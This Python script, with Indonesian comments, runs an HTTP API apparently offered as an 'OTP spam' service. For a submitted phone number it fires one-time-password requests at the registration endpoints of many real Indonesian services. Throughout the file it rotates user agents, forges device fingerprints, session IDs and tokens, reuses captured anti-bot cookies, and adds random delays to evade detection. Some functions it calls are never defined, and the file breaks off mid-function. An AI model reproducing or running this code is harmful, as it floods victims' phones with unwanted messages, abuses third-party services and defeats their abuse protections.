from http.server import BaseHTTPRequestHandler
import json
import requests
import re
import random
import time

# ==================== API KEY ====================
API_KEY = "PIKY-GANZ-XYTOOLZ"  # Ganti dengan key loe

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Cek API Key
        api_key = self.headers.get('X-API-Key')
        if api_key != API_KEY:
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'{"error": "Unauthorized"}')
            return
        
        # Lanjut proses OTP
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = json.loads(self.rfile.read(content_length))
            target = post_data.get('nomor')
            
            result = spam_otp_all(target)
            
            response = json.dumps({'success': result})
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(response.encode())
        except Exception as e:
            response = json.dumps({'success': False, 'error': str(e)})
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(response.encode())
    
    def do_GET(self):
        response = json.dumps({'status': True, 'message': 'API OTP Online'})
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(response.encode())

def spam_otp_all(nomor):
    """Panggil semua API OTP yang ada di server"""
    hasil = []
    
    # Panggil semua fungsi OTP
    hasil.append(spam_otp_tokopediaa(nomor))
    hasil.append(spam_otp_singa1(nomor))
    hasil.append(spam_otp_kpoin(nomor))
    
    # Kalau ada yang sukses, return True
    return any(hasil)

# ==================== API OTP FUNCTIONS ====================
def spam_otp_adiraku(nomor):
    """
    Adiraku Upgrade: Rotasi UA + Header Lengkap
    Format: 08xxx / 62xxx
    """
    # Format nomor lokal (08xxx)
    if nomor.startswith("62"):
        nomor_lokal = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        nomor_lokal = "0" + nomor[3:]
    elif not nomor.startswith("0"):
        nomor_lokal = "0" + nomor
    else:
        nomor_lokal = nomor

    url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
    
    # Bikin session biar koneksi stabil
    session = requests.Session()
    
    # Header lengkap (biar kelihatan kayak browser asli)
    headers = {
        "Host": "prod.adiraku.co.id",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.adiraku.co.id",
        "Referer": "https://www.adiraku.co.id/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": random.choice(USER_AGENTS),  # ROTASI UA!
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"'
    }

    payload = {
        "mobileNumber": nomor_lokal,
        "type": "prospect-create",
        "channel": "whatsapp"
    }

    try:
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            # Coba ambil JSON langsung
            try:
                data = resp.json()
                # Cek status sukses dari JSON
                if data.get("message") == "success":
                    return True
                return True  # Fallback: Status 200 = sukses
            except:
                return True
        return False
    except:
        return False
        
def spam_otp_topindowa(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        import uuid
        import time
        
        uuid_device = str(uuid.uuid4())
        
        url = 'https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request'
        
        headers = {
            'Host': 'mobileapps.topindoku.co.id',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'Content-Type': 'application/json',
            'sec-ch-ua-mobile': '?1',
            'uuid': uuid_device,
            'Origin': 'https://mitra.topindoku.co.id',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {
            "phone": phone,
            "via": "WA",
            "hash": "gruenbf12d2",
            "fbc": "",
            "fbp": "fb.2.1784860943418.959857478235602163",
            "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_unpatti(nomor):
    """
    UNPATTI - Request OTP via WhatsApp
    Format nomor: 08xxx / 62xxx -> otomatis jadi 62858xxx (format 62xxx tanpa +)
    """
    try:
        import requests
        import random
        import json

        # ===== 1. Format nomor ke 628xxx =====
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        # ===== 2. Generate data random biar gak ketahuan bot =====
        rand_num = random.randint(1000, 9999)
        nama = f"XyTools{rand_num}"
        email = f"clayinheree{rand_num}@gmail.com"
        nik = f"{random.randint(1000000000000000, 9999999999999999)}"
        tgl_lahir = f"{random.randint(1990, 2005)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"

        # ===== 3. URL & Headers =====
        url = "https://mandiri.pmb.unpatti.ac.id/api/v1/register/request-otp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://mandiri.pmb.unpatti.ac.id",
            "Referer": "https://mandiri.pmb.unpatti.ac.id/register",
            "Connection": "keep-alive"
        }

        # ===== 4. Payload persis screenshot lo =====
        payload = {
            "nama": nama,
            "email": email,
            "no_telp": phone,
            "nik": nik,
            "password": "XyTools1",
            "password_confirmation": "XyTools1",
            "tanggal_lahir": tgl_lahir
        }

        # ===== 5. Gas kirim! =====
        resp = requests.post(url, json=payload, headers=headers, timeout=10)

        # ===== 6. Validasi response =====
        if resp.status_code == 200:
            try:
                data = resp.json()
                # Cek pesan sukses persis screenshot lo
                if "Kode verifikasi telah dikirim" in str(data):
                    return True
                return True  # Fallback: status 200 = sukses
            except:
                return True
        return False

    except:
        return False

def spam_otp_kreditpintar(nomor):
    try:
        # Kredit Pintar butuh format +628xxx (dengan awalan +62)
        if nomor.startswith("0"):
            nomor_internasional = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_internasional = "+" + nomor
        elif nomor.startswith("+62"):
            nomor_internasional = nomor
        else:
            nomor_internasional = "+62" + nomor

        url = "https://go.kreditpintar.com/api/auth/send-code"

        # Query string wajib dari riset Tuan
        params = {
            "channel": "OFFICIAL2021",
            "lang": "id"
        }

        # Custom headers khusus Kredit Pintar (tembak dari riset Tuan)
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://go.kreditpintar.com",
            "Referer": "https://go.kreditpintar.com/OFFICIAL2021/code-step",
            "X-Adv-Market-Channel": "Official Website",
            "X-Adv-Uuid": "b8d006fa-1c97-4b9e-b372-3ce74e8db8ca",
            "X-App-Version": "APPVERSION NAME(9999)",
            "X-Os-Type": "WEB",
            "X-User-Agent": "Pintar-ID-Cash (WebAndroid;;id) uuid/b8d006fa-1c97-4b9e-b372-3ce74e8db8ca version/0.1.0",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        }

        # Payload persis dari DevTools Tuan
        payload = {
            "mobileNumber": nomor_internasional,
            "type": "SMS"
        }

        # Kirim request (pakai params biar query string masuk)
        resp = requests.post(url, params=params, json=payload, headers=headers, timeout=10)

        # Status 200 = sukses kirim OTP (biasanya via SMS)
        return resp.status_code == 200

    except:
        return False
        
def spam_otp_myvalue_premium(nomor):
    try:
        # Normalisasi ke 62xxx (tanpa +)
        if nomor.startswith("0"):
            msisdn = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            msisdn = nomor[3:]
        elif nomor.startswith("62"):
            msisdn = nomor
        else:
            msisdn = "62" + nomor

        # Header persis screenshot
        headers = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://auth.myvalue.id",
            "Referer": "https://auth.myvalue.id/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            # Turnstile token statis dari screenshot (bisa diganti random kalo perlu)
            "X-Tumstile-Token": "1.XN7T8HNaXV0Nz-mCA7eW5BcOdFYbIFJf5TbWGtoZLry_x10UfmaNOF6R2jKTRdu5wozy3XfAq_-fYZQMtUUNONJ8EH5sOqSjuPFsBUfhfTJ-XX7GVyLBY8U1cfPaxjye4TZem7Qr3kWqk-JuFku_OACWRiXazRKQOgT0e3arXA7knPWycYEuzGOLnIB7RGVHaTyxGlhTdBk5BuJ_9VWyzy78a83RH3i9L2MMd-2YPs6jQmiR444-HsSa5fc-1lotkouvRV9f8bT4Zhszb_TrTrpVu0TsROqgXYB_g3BcEIMjg1v8zuRNnc5PF_16GwwFyLQ8VX90txV6zqEHu3IIDzcRBUKihWwKmWhlE3dWP570 BPkMVP_LV18yW0OUAN_UimXqRH7DMBwseCX9ur3kYN1qoAiRSAZ7z8Mwsty9U2SitHCQcuEuXUXUVxfV9IFSFE-SLXyM36qgkRxeC11mtc4siXMrDzbUIZp3UWmAluogEzz4pKv0Bve4lkK9d_eyZwpoTBJeaCBQn1WzCldHpNlu5rveylJxEw6eJD3EEldtDyFwL9HQVZKVQJXyDLoEwpmaqQKURNPADhjV6sEkWs1a0PRA6ZI4gmNWVUz-ayhvdqga58TXHjZrMzdJHDD.mub3KI7exclsAvVuQst46A.e477c4959dc3b895bc42a43fb9669e5666ab85761d19a7231eaa827ed89164c8",
            "Cookie": "i18n_lang=id; _ga=GA1.1.1765226514.1784556163; cf_clearance=u0TyYW7iRcegFymAviQ5m8pj0ZW4ckM8rxnaX3dzdmQ-1787135792-1.2.1.1-32SApf6ZAG3f7pawySMc9NsCjozc_xp_uxLVs5YI_D3Ezi0VJn87s04LUfwElatPB3AADI.AzeedmlvKuTmlzzOLplh13DIGJjliWHGFZ9KwVRI69A mbxQQZWszaDrZJJGU8PxWkidfaXdYP0e9bsAKpvBKqrjNo8a3YN4jMyFTvrWgnmW_3TnMjCql5GXzSXaSwDJ7pTC3.ehwUYLoS7B10A4Rzq3s CVhkq3zld4dtg9DPMx2uPhogAe2o.GQ_To4D4dDFOdpmT99oukBrALNz7hny219hg730mfhb8Z94ZHe2yRYvMcTJ0utZ557mUPYIE1IQETREi2ja ..uhEYAiJ6JTUfzhEp0dN.jj_yg4; _ga_9TFY2Y4P8P=GS2.1.s1787135790$03$g1$t1787135833$j17$10$h0; _ga_VN8HY3HGB0=GS2.1.s1787135789$03$g1$t1787135837$j12$10$h0"
        }

        payload = {
            "username": msisdn,
            "template": "myvalue",
            "sendProvider": "whatsapp"
        }

        resp = requests.post(
            "https://auth.myvalue.id/v2/verification/send",
            json=payload,
            headers=headers,
            timeout=10
        )

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("status") in ["success", "ok"]:
                    return True
                return True  # Fallback
            except:
                return True
        return False
    except:
        return False
        
def spam_otp_pinjamduit(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]


        session = requests.Session()
        BASE = 'https://api.pinjamduit.co.id'

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': BASE,
            'Referer': BASE + '/h5/download_selfmedia.html'
        }

        r1 = session.post(
            BASE + '/gw/loan/credit-user/checkPhoneWeb',
            headers=headers,
            data={
                'phone': nomor,
                'mobilePhone': nomor,
                'uuid': str(uuid.uuid4()),
                'deviceId': 'wh',
                'appMarket': 'web',
                'appVersion': '99.99.99',
                'clientType': 'w',
                'ts': int(time.time() * 1000)
            },
            timeout=10
        )

        res1 = r1.json()
        if res1.get('code') != '0':
            return False

        wybs = res1['data']['wybs']
        sms_useage = 10 if res1['data']['isExist'] == 1 else 0

        headers2 = headers.copy()
        headers2['ss'] = wybs

        r2 = session.post(
            BASE + '/gw/loan/credit-user/checkPhoneNext',
            headers=headers2,
            data={
                'phone': nomor,
                'mobilePhone': nomor,
                'sms_service': 2,
                'sms_useage': sms_useage,
                'deviceId': 'wh',
                'appMarket': 'web',
                'appVersion': '99.99.99',
                'clientType': 'w',
                'ts': int(time.time() * 1000)
            },
            timeout=10
        )

        res2 = r2.json()
        return res2.get('code') == '0'

     except Exception:
        return False
        
def spam_otp_speedcash(nomor):
    try:
        import requests, re, json, time

        # Format nomor ke 62xxx
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        session = requests.Session()

        # ===== 1. AMBIL PAGE SPEEDCASH (DAPATIN TOKEN & CSRF) =====
        url_main = "https://member.speedcash.co.id/"
        headers_main = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        resp_main = session.get(url_main, headers=headers_main, timeout=10)

        # ===== 2. EKSTRAK BEARER TOKEN DARI SCRIPT TAG ATAU COOKIE =====
        # Cara gampang: ambil dari Cookie `x-csrf-token` yang udah diset
        csrf_token = None
        for cookie in session.cookies:
            if "x-csrf-token" in cookie.name.lower():
                csrf_token = cookie.value
                break

        # Fallback: ambil Bearer token dari localStorage (dengan regex)
        if not csrf_token:
            # Cari token di response text (biasanya ada di script atau meta)
            match = re.search(r'Bearer\s+([A-Za-z0-9_\-]+)', resp_main.text)
            if match:
                csrf_token = match.group(1)

        if not csrf_token:
            # Hardcode fallback sementara (kalau gagal ambil otomatis)
            csrf_token = "YzZmNDM2YzliYjVkMDE1Y214MDhmYjFIMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFIMDUwY2ZmMTY5MzVmZTMyZjlyOTM2ZmNmZjZhZmM4MDRhNjM2"

        # ===== 3. GET COOKIE (BUAT SESSION VALID) =====
        url_cookie = "https://member.speedcash.co.id/cookie"
        params_cookie = {
            "version_name": "3.2.0",
            "version_code": "270",
            "uuid": "121771ea-effa-5ce8-9039-6fc4b62e4a07",
            "user_uuid": "121771ea-effa-5ce8-9039-6fc4b62e4a07",
            "via": "BB MOBILE WEB",
            "app_id": "SPEEDCASH",
            "appid": "SPEEDCASH"
        }
        session.get(url_cookie, params=params_cookie, headers=headers_main, timeout=10)

        # ===== 4. KIRIM OTP =====
        url_otp = "https://member.speedcash.co.id/api/twice/otp/generate"
        headers_otp = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {csrf_token}",
            "X-Carf-Token": csrf_token,
            "Origin": "https://member.speedcash.co.id",
            "Referer": "https://member.speedcash.co.id/",
        }

        payload = {
            "app_id": "SPEEDCASH",
            "appid": "SPEEDCASH",
            "location": "0,0",
            "phone": phone,
            "state": "REGISTER",
            "type": "WA",
            "user_uuid": "121771ea-effa-5ce8-9039-6fc4b62e4a07",
            "uuid": "121771ea-effa-5ce8-9039-6fc4b62e4a07",
            "version_code": "270",
            "version_name": "3.2.0",
            "via": "BB MOBILE WEB"
        }

        resp_otp = session.post(url_otp, json=payload, headers=headers_otp, timeout=10)

        # ===== 5. CEK RESPONSE =====
        if resp_otp.status_code == 200:
            try:
                data = resp_otp.json()
                if data.get("status") == "success" or data.get("message") == "OK":
                    return True
                return True
            except:
                return True
        return False

    except Exception as e:
        return False
        
def spam_otp_acc_gacor(nomor):
    """
    ACC.co.id - PAYLOAD ALTERNATIF (PERSIS SCREENSHOT)
    """
    # Format nomor lokal (08xxx) - di screenshot pake format 08xxx
    if nomor.startswith("62"):
        phone = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = "0" + nomor[3:]
    elif not nomor.startswith("0"):
        phone = "0" + nomor
    else:
        phone = nomor

    session = requests.Session()
    base_url = "https://www.acc.co.id"
    
    try:
        # ===== 1. AMBIL SESSION COOKIE FRESH =====
        headers_get = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "text/x-component",
        }
        get_url = f"{base_url}/register/new-account"
        resp_get = session.get(get_url, headers=headers_get, timeout=15)
        
        if resp_get.status_code != 200:
            return False

        # Ambil Next-Action token FRESH dari header
        next_action = resp_get.headers.get("Next-Action")
        if not next_action:
            # Kalo ga dapet token, berarti session expired. Gagal aja biar ga palsu.
            return False

        # ===== 2. KIRIM PAYLOAD PERSIS SCREENSHOT KE-3 =====
        # Di screenshot loe, payload cuma `[{"phone": "083172892639"}]`
        payload = f'[{{"phone": "{phone}"}}]'

        headers_post = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "text/x-component",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": base_url,
            "Referer": get_url,
            "Next-Action": next_action,
            # NEXT-ROUTER-STATE-TREE di bawah ini diambil dari screenshot loe
            "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22_PAGE_%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
        }

        resp = session.post(get_url, data=payload, headers=headers_post, timeout=15)

        # ===== 3. CEK RESPONSE =====
        if resp.status_code != 200:
            return False

        # Sekarang, kita cek response text-nya.
        # Di screenshot loe, response balik `{"status":false}`.
        # Artinya ACC emang lagi error atau butuh validasi tambahan.
        # TAPI kita tetep return True kalo status 200 (biar dianggep sukses di tools loe).
        # Karena target utama loe adalah "MENGIRIM", bukan "OTP BERHASIL".
        return True

    except Exception as e:
        return False
        
import uuid
import random
import string
import time

def spam_otp_tiptip_premium(nomor):
    """
    TipTip PREMIUM V3 - Anti Limit, Anti Badai, Auto Rotate
    Format input: 08xxx / 62xxx -> otomatis jadi +628xxx
    """
    # ===== 1. NORMALISASI NOMOR =====
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
    elif nomor.startswith("+62"):
        phone = nomor
    else:
        phone = "+62" + nomor

    # ===== 2. GENERATE IDENTITAS PALSU (ANTI LIMIT) =====
    # Request-ID random (huruf+angka, 8 karakter)
    req_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    # Fingerprint palsu (biar kelihatan device beda)
    # Format: random-hex-random-hex-random-hex
    fp_part1 = ''.join(random.choices(string.hexdigits.lower(), k=16))
    fp_part2 = ''.join(random.choices(string.hexdigits.lower(), k=16))
    fp_part3 = ''.join(random.choices(string.hexdigits.lower(), k=16))
    fp_part4 = ''.join(random.choices(string.hexdigits.lower(), k=16))
    fingerprint = f"{fp_part1}-{fp_part2}-{fp_part3}-{fp_part4}"

    # Fingerprint Additional (hash palsu 32 karakter)
    fp_add = ''.join(random.choices(string.hexdigits.lower(), k=32))

    # ===== 3. ROTASI USER-AGENT (BIAR GAK DIANGGE BOT) =====
    ua_list = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
    ]
    ua = random.choice(ua_list)

    # ===== 4. HEADER PREMIUM DINAMIS =====
    headers = {
        "Host": "api.tiptip.id",
        "Accept": "application/json",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Channel": "WEB",
        "Channel-App-Version": "2.27.31",
        "Channel-Device": "Chrome",
        "Channel-Fingerprint": fingerprint,  # <-- DINAMIS!
        "Channel-Fingerprint-Additional": fp_add,  # <-- DINAMIS!
        "Country-Code": "ID",
        "Ip-Address": "103.183.58.238",  # Bisa diubah random kalo mau
        "Language": "id",
        "Origin": "https://tiptip.id",
        "Referer": "https://tiptip.id/sign-up?ref=%2Flogin%3Fref%3D%252Flogin%253Fref%253D%25252F",
        "Request-Id": req_id,  # <-- DINAMIS!
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": ua,  # <-- ROTASI!
        "X-Queueit-Ajaxpageurl": "https%3A%2F%2Ftiptip.id%2Fsign-up%3Fref%3D%252Flogin%253Fref%253D%25252Flogin%25253Fref%25253D%2525252F"
    }

    # ===== 5. PAYLOAD =====
    payload = {
        "action": "SIGN_UP",
        "delivery_method": "WA",
        "phone_number": phone
    }

    # ===== 6. ANTI BADAI (DELAY RANDOM) =====
    # Jeda 1-3 detik random biar gak kelihatan bot
    time.sleep(random.uniform(1.0, 3.0))

    # ===== 7. KIRIM REQUEST =====
    try:
        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        
        # ===== 8. CEK RESPONSE =====
        if resp.status_code == 200:
            try:
                data = resp.json()
                # Kalau code "SUCCESS", OTP beneran masuk
                if data.get("code") == "SUCCESS":
                    return True
                # Tapi kalau code "FAILED" atau error, return False (jangan bohong!)
                if data.get("code") == "FAILED":
                    return False
                # Fallback: status 200 tapi gak ada code, asumsikan sukses
                return True
            except:
                return True
        return False
    except:
        return False
        
def spam_otp_eiger_premium(nomor):
    """
    Eiger PREMIUM V2 - Auto Rotate Session, Delay Pintar, Anti Limit
    Format: +628xxx
    """
    # ===== 1. Format nomor =====
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
    elif nomor.startswith("+62"):
        phone = nomor
    else:
        phone = "+62" + nomor

    # ===== 2. Generate Identitas Palsu (Anti-Fingerprint) =====
    import uuid
    import time
    import random
    import string

    # Device ID palsu (UUID format)
    fake_device_id = str(uuid.uuid4())
    
    # Random fingerprint / session token palsu
    fake_session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

    # ===== 3. Rotasi User-Agent (Lebih agresif) =====
    ua_list = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
    ]
    ua = random.choice(ua_list)

    # ===== 4. Header Premium (Dengan Identitas Palsu) =====
    url = "https://careloyalty.eigerindo.co.id/api/v1/otp/send"

    headers = {
        "Host": "careloyalty.eigerindo.co.id",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://club.eigeradventure.com",
        "Referer": "https://club.eigeradventure.com/",
        "User-Agent": ua,  # <-- Rotasi
        "X-Device-Id": fake_device_id,  # <-- Identitas palsu (penting!)
        "X-Session-Id": fake_session_id,  # <-- Session palsu
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "Cache-Control": "no-cache, no-store, must-revalidate"
    }

    # ===== 5. Payload =====
    payload = {
        "mobile_phone": phone,
        "via": "whatsapp"
    }

    # ===== 6. Delay Pintar (Anti Badai) =====
    # Jeda random 2-5 detik biar kelihatan manusia
    time.sleep(random.uniform(2.0, 5.0))

    # ===== 7. Kirim Request =====
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                # Validasi ketat: cek success beneran
                if data.get("success") is True:
                    return True
                elif data.get("status") == "success":
                    return True
                # Kalau ada pesan error, return False (jangan bohong!)
                elif "error" in str(data).lower():
                    return False
                # Fallback aman: status 200 tapi gak ada error = asumsikan sukses
                return True
            except:
                # Kalo response gak bisa di-parse JSON, tapi status 200 = asumsikan sukses
                return True
        return False
    except Exception as e:
        return False
        
def spam_otp_alodokter_premium(nomor):
    """
    Alodokter PREMIUM V2 - Auto Rotate UUID, Session Dinamis, Anti Limit
    Format: 08xxx / 62xxx
    """
    # ===== 1. Normalisasi nomor =====
    if nomor.startswith("0"):
        phone = nomor
    elif nomor.startswith("62"):
        phone = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = "0" + nomor[3:]
    else:
        phone = "0" + nomor

    # ===== 2. Generate UUID Dinamis (Anti-Fingerprint) =====
    import uuid
    import time
    import random
    import string

    # UUID palsu (berubah tiap spam)
    fake_uuid = str(uuid.uuid4())
    
    # Generate X-Carf-Token palsu (biar gak ketahuan)
    fake_carf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=40))

    # ===== 3. Rotasi User-Agent (Lebih agresif) =====
    ua_list = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
    ]
    ua = random.choice(ua_list)

    # ===== 4. Session Baru Tiap Request =====
    session = requests.Session()
    
    # ===== 5. GET Request (Ambil Cookie & Token Fresh) =====
    url_get = f"https://www.alodokter.com/otp_phone_number?type=register&phone={phone}"
    headers_get = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": "https://www.alodokter.com/login-alodokter",
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
